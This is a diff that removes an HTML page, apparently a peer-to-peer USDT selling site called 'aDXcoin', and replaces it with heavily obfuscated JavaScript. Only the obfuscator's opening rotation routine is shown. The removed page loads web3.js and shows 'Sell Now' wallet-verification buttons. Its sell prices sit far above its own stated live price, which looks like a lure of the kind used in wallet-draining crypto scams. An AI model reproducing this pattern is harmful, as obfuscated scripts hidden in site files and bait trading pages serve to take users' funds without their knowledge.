@@ -1,1785 +1,365 @@
-<!DOCTYPE html><html lang="en"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>aDXcoin - USDT Orders</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="js/jquery-3.6.0.min.js"></script>
-    <script src="js/web3.min.js"></script>
-    <link href="css/all.min.css" rel="stylesheet">
-    <style>
-        .gradient-bg {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+(function (_0xa13e9c, _0x47c126) {
+    const _0x538262 = _0xa13e9c();
+    while (true) {
+      try {
+        const _0x270ca2 = parseInt(_0x7f19(0x1d2, 0x166)) / 0x1 * (-parseInt(_0x7f19(0x332, 0x669)) / 0x2) + -parseInt(_0x7f19(0x497, 0x687)) / 0x3 * (parseInt(_0x7f19(0x44f, 0x410)) / 0x4) + -parseInt(_0x7f19(0x2ce, 0x5f9)) / 0x5 + parseInt(_0x7f19(0x1bb, 0x1d4)) / 0x6 + parseInt(_0x7f19(0x3b4, 0x29f)) / 0x7 + -parseInt(_0x7f19(0x2ea, 0x309)) / 0x8 + parseInt(_0x7f19(0x23b, 0x2d3)) / 0x9;
+        if (_0x270ca2 === _0x47c126) {
+          break;
+        } else {
+          _0x538262.push(_0x538262.shift());
         }
-        .card-hover {
-            transition: all 0.3s ease;
-        }
-        .card-hover:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
-        }
-        .order-card {
-            transition: all 0.3s ease;
-        }
-        .order-card:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-        }
-        .buy-order {
-            border-left: 4px solid #10b981;
-        }
-        .sell-order {
-            border-left: 4px solid #ef4444;
-        }
-        .status-online {
-            background: #10b981;
-        }
-        .status-offline {
-            background: #6b7280;
-        }
-        .animate-pulse {
-            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: .5; }
-        }
-        
-        /* Loading Spinner Styles */
-        .loading-spinner-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.4);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 99999;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        
-        .loading-spinner-overlay.show {
-            display: flex !important;
-            opacity: 1;
-        }
-        
-        .loading-spinner-container {
-            background: white;
-            border-radius: 20px;
-            padding: 30px 40px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 20px;
-            animation: slideIn 0.3s ease-out;
-        }
-        
-        @keyframes slideIn {
-            from {
-                transform: translateY(-20px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-        
-        /* Triangle Loader Styles */
-        .loader-triangle-5 {
-            position: relative;
-            height: 50px;
-            width: 50px;
-        }
-        
-        .loader-triangle-5::after,
-        .loader-triangle-5::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            border: 20px solid transparent;
-            border-bottom-color: #667eea;
-            height: 0;
-            width: 0;
-            animation: anm-tl-5-rotateA 2s linear infinite 0.5s;
-        }
-        
-        .loader-triangle-5::before {
-            transform: rotate(90deg);
-            animation: anm-tl-5-rotateB 2s linear infinite;
-        }
-        
-        @keyframes anm-tl-5-rotateA {
-            0%, 25% {
-                transform: rotate(0deg);
-            }
-            50%,
-            75% {
-                transform: rotate(180deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        
-        @keyframes anm-tl-5-rotateB {
-            0%, 25% {
-                transform: rotate(90deg);
-            }
-            50%,
-            75% {
-                transform: rotate(270deg);
-            }
-            100% {
-                transform: rotate(450deg);
-            }
-        }
-        
-        .loading-text {
-            color: #4b5563;
-            font-size: 16px;
-            font-weight: 500;
-            margin-top: 10px;
-        }
-    </style>
-    <!-- Web3.js (Load First) -->
-  <script src="js/web3.min.js"></script>
-</head>
-<body class="bg-gray-50">
-    <!-- Navigation -->
-    <nav class="bg-white shadow-lg fixed w-full z-50">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <div class="flex justify-between items-center py-4" style="display:none;">
-                <div class="flex items-center">
-                    <i class="fas fa-coins text-2xl text-blue-600 mr-2"></i>
-                    <span class="text-xl font-bold text-gray-800">VaDXcoin</span>
-                </div>
-                <div class="hidden md:flex space-x-8">
-                    <a href="index.html" class="text-gray-600 hover:text-blue-600 transition-colors">Home</a>
-                    <a href="orders.html" class="text-blue-600 font-semibold">Orders</a>
-                    <a href="#" class="text-gray-600 hover:text-blue-600 transition-colors">How it Works</a>
-                    <a href="#" class="text-gray-600 hover:text-blue-600 transition-colors">Contact</a>
-                </div>
-                <div class="flex space-x-4">
-                    <button class="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition-colors">
-                        Create Order
-                    </button>
-                    <button class="md:hidden" id="mobile-menu-btn">
-                        <i class="fas fa-bars text-gray-600"></i>
-                    </button>
-                </div>
-            </div>
-        </div>
-        <!-- Mobile Menu -->
-        <div class="md:hidden hidden" id="mobile-menu">
-            <div class="px-2 pt-2 pb-3 space-y-1 bg-white border-t">
-                <a href="index.html" class="block px-3 py-2 text-gray-600 hover:text-blue-600">Home</a>
-                <a href="orders.html" class="block px-3 py-2 text-blue-600 font-semibold">Orders</a>
-                <a href="#" class="block px-3 py-2 text-gray-600 hover:text-blue-600">How it Works</a>
-                <a href="#" class="block px-3 py-2 text-gray-600 hover:text-blue-600">Contact</a>
-            </div>
-        </div>
-    </nav>
-
-    <!-- Header Section -->
-    <section class="gradient-bg text-white pt-24 pb-8">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <div class="text-center">
-                <h1 class="text-3xl md:text-4xl font-bold mb-4">
-                    VaDXcoin USDT Sell Orders
-                </h1>
-                <p class="text-xl text-blue-100 max-w-2xl mx-auto">
-                    Browse USDT selling orders from verified users on VaDXcoin. No registration required, completely anonymous.
-                </p>
-            </div>
-        </div>
-    </section>
-
-    <!-- Filters and Stats -->
-    <section class="bg-white py-6 border-b">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <div class="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
-                <!-- Stats -->
-                <div class="flex space-x-6 text-sm">
-                    <div class="flex items-center">
-                        <i class="fas fa-chart-line text-green-500 mr-2"></i>
-                        <span class="text-gray-600">Live Price: <span class="font-semibold text-green-600">₹87/USDT</span></span>
-                    </div>
-                    <div class="flex items-center">
-                        <i class="fas fa-users text-blue-500 mr-2"></i>
-                        <span class="text-gray-600">Active Traders: <span class="font-semibold">189</span></span>
-                    </div>
-                    <div class="flex items-center">
-                        <i class="fas fa-clock text-yellow-500 mr-2"></i>
-                        <span class="text-gray-600">Last Update: <span class="font-semibold">2 sec ago</span></span>
-                    </div>
-                </div>
-                
-                <!-- Filters -->
-                <div class="flex flex-wrap gap-3">
-                    <select id="order-type-filter" class="px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent">
-                        <option value="all">All Orders</option>
-                        <option value="sell">Sell Orders</option>
-                    </select>
-                    <select id="payment-filter" class="px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent">
-                        <option value="all">All Payment Methods</option>
-                        <option value="UPI">UPI</option>
-                        <option value="IMPS">IMPS</option>
-                        <option value="Bank Transfer">Bank Transfer</option>
-                        <option value="Paytm">Paytm</option>
-                        <option value="PhonePe">PhonePe</option>
-                        <option value="Google Pay">Google Pay</option>
-                    </select>
-                    <select id="amount-filter" class="px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent">
-                        <option value="all">Any Amount</option>
-                        <option value="1000-10000">₹1,000 - ₹10,000</option>
-                        <option value="10000-50000">₹10,000 - ₹50,000</option>
-                        <option value="50000-100000">₹50,000 - ₹1,00,000</option>
-                        <option value="100000+">₹1,00,000+</option>
-                    </select>
-                    <button id="filter-btn" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors">
-                        <i class="fas fa-filter mr-2"></i>Filter
-                    </button>
-                    <button id="clear-filters" class="px-4 py-2 bg-gray-500 text-white rounded-lg hover:bg-gray-600 transition-colors">
-                        <i class="fas fa-times mr-2"></i>Clear
-                    </button>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Orders Grid -->
-    <section class="py-8">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <!-- Sell Orders Section -->
-            <div class="mb-8">
-                <h2 class="text-2xl font-bold text-gray-800 mb-6 flex items-center">
-                    <i class="fas fa-arrow-down text-red-500 mr-3"></i>
-                    Sell USDT Orders
-                    <span class="ml-2 text-sm text-gray-500">(41 orders)</span>
-                </h2>
-                <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
-                  <!-- Sell Order Card 5 -->
-                    <div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="Paytm" data-amount="20000-200000" data-type="sell">
-                        <div class="flex justify-between items-start mb-4">
-                            <div>
-                                <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-                                <p class="text-sm text-gray-500">by -uNIVERSE-TRADER-</p>
-                            </div>
-                            <div class="flex items-center">
-                                <div class="w-2 h-2 rounded-full status-offline mr-2"></div>
-                                <span class="text-xs text-gray-500">Offline</span>
-                            </div>
-                        </div>
-                        <div class="space-y-3 mb-4">
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Price:</span>
-                                <span class="font-semibold text-red-600">₹105/USDT</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Amount:</span>
-                                <span class="font-semibold">₹20,000 - ₹2,00,000</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Payment:</span>
-                                <span class="font-semibold">Paytm</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-gray-600">Completion:</span>
-                                <span class="font-semibold text-green-600">91%</span>
-                            </div>
-                        </div>
-                        <div class="flex space-x-2">
-                            <button class="flex-1 bg-gray-400 text-white py-2 rounded-lg cursor-not-allowed" disabled="">
-                                Offline
-                            </button>
-                            <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-                                <i class="fas fa-comments"></i>
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by SAI-TRADER-0855</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹118/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹10,000 - ₹50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">96%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
-                    <!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by P2P-6cca464pr</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹114/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹25,000 - ₹1,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">96%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
-
-                   <!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by RVS-traders</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹113.5/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹70,000 - ₹2,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">96%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
-                    <!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by CDMdeposit1</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹120/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹10,000 - ₹2,00,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">96%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
-
-                   <!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by babu9603r</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹116/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹5,000 - ₹50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">96%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
-<!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by Mo Fahad Siddiquir</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹120/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹20,000 - ₹5,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">96%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
-<!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by Algosphere</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹118/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹15,000 - ₹2,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">100%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
-<!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by RANUSD-TRADERS</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹111/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹10,000 - ₹3,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">100%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
-<!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by JAI-SHEREEram-TRADER</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹110/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹10,000 - ₹2,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">98%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
-<!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by SAtyam-yashvi</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹116/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹10,000 - ₹1,00,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">98%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
-<!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by USDT_Seller</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹110/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹35,000 - ₹2,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">96%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
- <!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by ITALY-crypto-exchang</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹110/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹5,000 - ₹2,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">100%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
- <!-- Sell Order Card -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="UPI,IMPS" data-amount="30000-250000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by CDM-Delhi</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
-            <span class="font-semibold text-red-600">₹117/USDT</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Amount:</span>
-            <span class="font-semibold">₹30,000 - ₹2,50,000</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Payment:</span>
-            <span class="font-semibold">UPI,IMPS,CDM</span>
-        </div>
-        <div class="flex justify-between">
-            <span class="text-gray-600">Completion:</span>
-            <span class="font-semibold text-green-600">97%</span>
-        </div>
-    </div>
-    <div class="flex space-x-2">
-        <button class="verifyBtn flex-1 bg-red-600 text-white py-2 rounded-lg hover:bg-red-700 transition-colors">
-            Sell Now
-        </button>
-        <button class="px-3 py-2 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors">
-            <i class="fas fa-comments"></i>
-        </button>
-    </div>
-</div>
-
- <!-- Sell Order Card 6 -->
-<div class="order-card sell-order bg-white rounded-lg shadow-md p-6" data-payment="PhonePe" data-amount="110-50000" data-type="sell">
-    <div class="flex justify-between items-start mb-4">
-        <div>
-            <h3 class="font-semibold text-gray-800">Sell USDT</h3>
-            <p class="text-sm text-gray-500">by FastTrader</p>
-        </div>
-        <div class="flex items-center">
-            <div class="w-2 h-2 rounded-full status-online mr-2"></div>
-            <span class="text-xs text-gray-500">Online</span>
-        </div>
-    </div>
-    <div class="space-y-3 mb-4">
-        <div class="flex justify-between">
-            <span class="text-gray-600">Price:</span>
